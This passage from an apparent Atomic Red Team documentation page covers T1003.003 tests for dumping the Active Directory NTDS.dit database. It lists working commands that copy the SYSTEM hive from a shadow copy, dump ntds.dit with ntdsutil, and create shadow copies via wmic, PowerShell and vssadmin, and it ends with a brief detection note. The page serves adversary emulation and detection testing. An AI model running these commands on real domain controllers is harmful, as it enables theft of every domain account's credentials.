copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-3-dump-active-directory-database-with-ntdsutil">
<h3>Atomic Test #3 - Dump Active Directory Database with NTDSUtil<a class="headerlink" href="#atomic-test-3-dump-active-directory-database-with-ntdsutil" title="Permalink to this headline">¶</a></h3>
<p>This test is intended to be run on a domain Controller.</p>
<p>The Active Directory database NTDS.dit may be dumped using NTDSUtil for offline credential theft attacks. This capability
uses the “IFM” or “Install From Media” backup functionality that allows Active Directory restoration or installation of
subsequent domain controllers without the need of network-based replication.</p>
<p>Upon successful completion, you will find a copy of the ntds.dit file in the C:\Windows\Temp directory.</p>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)</p>
<div class="section" id="id10">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">None</span></code>!<a class="headerlink" href="#id10" title="Permalink to this headline">¶</a></h4>
<div class="section" id="id11">
<h5>Description: Target must be a Domain Controller<a class="headerlink" href="#id11" title="Permalink to this headline">¶</a></h5>
</div>
<div class="section" id="id12">
<h5>Check Prereq Commands:<a class="headerlink" href="#id12" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT

</pre></div>
</div>
</div>
<div class="section" id="id13">
<h5>Get Prereq Commands:<a class="headerlink" href="#id13" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>echo Sorry, Promoting this machine to a Domain Controller must be done manually

</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span> <span class="o">-</span><span class="n">GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="id14">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id14" title="Permalink to this headline">¶</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>mkdir C:\Windows\Temp\ntds_T1003
ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full C:\Windows\Temp\ntds_T1003&quot; q q
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-4-create-volume-shadow-copy-with-wmi">
<h3>Atomic Test #4 - Create Volume Shadow Copy with WMI<a class="headerlink" href="#atomic-test-4-create-volume-shadow-copy-with-wmi" title="Permalink to this headline">¶</a></h3>
<p>This test is intended to be run on a domain Controller.</p>
<p>The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.</p>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)</p>
<div class="section" id="id15">
<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">None</span></code>!<a class="headerlink" href="#id15" title="Permalink to this headline">¶</a></h4>
<div class="section" id="id16">
<h5>Description: Target must be a Domain Controller<a class="headerlink" href="#id16" title="Permalink to this headline">¶</a></h5>
</div>
<div class="section" id="id17">
<h5>Check Prereq Commands:<a class="headerlink" href="#id17" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions  /v ProductType | findstr LanmanNT

</pre></div>
</div>
</div>
<div class="section" id="id18">
<h5>Get Prereq Commands:<a class="headerlink" href="#id18" title="Permalink to this headline">¶</a></h5>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>echo Sorry, Promoting this machine to a Domain Controller must be done manually

</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span> <span class="o">-</span><span class="n">GetPreReqs</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="id19">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id19" title="Permalink to this headline">¶</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>wmic shadowcopy call create Volume=C:
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">4</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-5-create-volume-shadow-copy-with-powershell">
<h3>Atomic Test #5 - Create Volume Shadow Copy with Powershell<a class="headerlink" href="#atomic-test-5-create-volume-shadow-copy-with-powershell" title="Permalink to this headline">¶</a></h3>
<p>This test is intended to be run on a domain Controller.</p>
<p>The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.</p>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)</p>
<div class="section" id="attack-commands-run-with-powershell">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span>(gwmi -list win32_shadowcopy).Create(C:,&#39;ClientAccessible&#39;)
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">5</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="atomic-test-6-create-symlink-to-volume-shadow-copy">
<h3>Atomic Test #6 - Create Symlink to Volume Shadow Copy<a class="headerlink" href="#atomic-test-6-create-symlink-to-volume-shadow-copy" title="Permalink to this headline">¶</a></h3>
<p>This test is intended to be run on a domain Controller.</p>
<p>The Active Directory database NTDS.dit may be dumped by creating a symlink to Volume Shadow Copy.</p>
<p><strong>Supported Platforms:</strong> windows
Elevation Required (e.g. root or admin)</p>
<div class="section" id="id20">
<h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id20" title="Permalink to this headline">¶</a></h4>
<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>vssadmin.exe create shadow /for=C:
mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
</pre></div>
</div>
<div class="cell docutils container">
<div class="cell_input docutils container">
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1003</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">6</span>
</pre></div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="section" id="detection">
<h2>Detection<a class="headerlink" href="#detection" title="Permalink to this headline">¶</a></h2>
<p>Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.</p>
</div>
</div>

    <script type="text/x-thebe-config">
    {
        requestKernel: true,
        binderOptions: {
            repo: "binder-examples/jupyter-stacks-datascience",
            ref: "master",
        },
        codeMirrorConfig: {
            theme: "abcdef",
            mode: ".net-powershell"
        },
        kernelOptions: {
            kernelName: ".net-powershell",
            path: "./tactics/credential-access"
        },
        predefinedOutput: true
    }
    </script>
    <script>kernelName = '.net-powershell'</script>

              </div>
              
        </div>
    </div>
    
    
    <div class='prev-next-bottom'>
        
    <a class='left-prev' id="prev-link" href="T1003.html" title="previous page">T1003 - OS Credential Dumping</a>
    <a class='right-next' id="next-link" href="T1003.001.html" title="next page">T1003.001 - OS Credential Dumping: LSASS Memory</a>

    </div>
    <footer class="footer mt-5 mt-md-0">
    <div class="container">
      <p>
        
          By Hare Sudhan Muthusamy<br/>
        
            &copy; Copyright 2020.<br/>
      </p>
    </div>
  </footer>
</main>


      </div>
    </div>

    <script src="../../_static/js/index.js"></script>
    
  </body>
</html>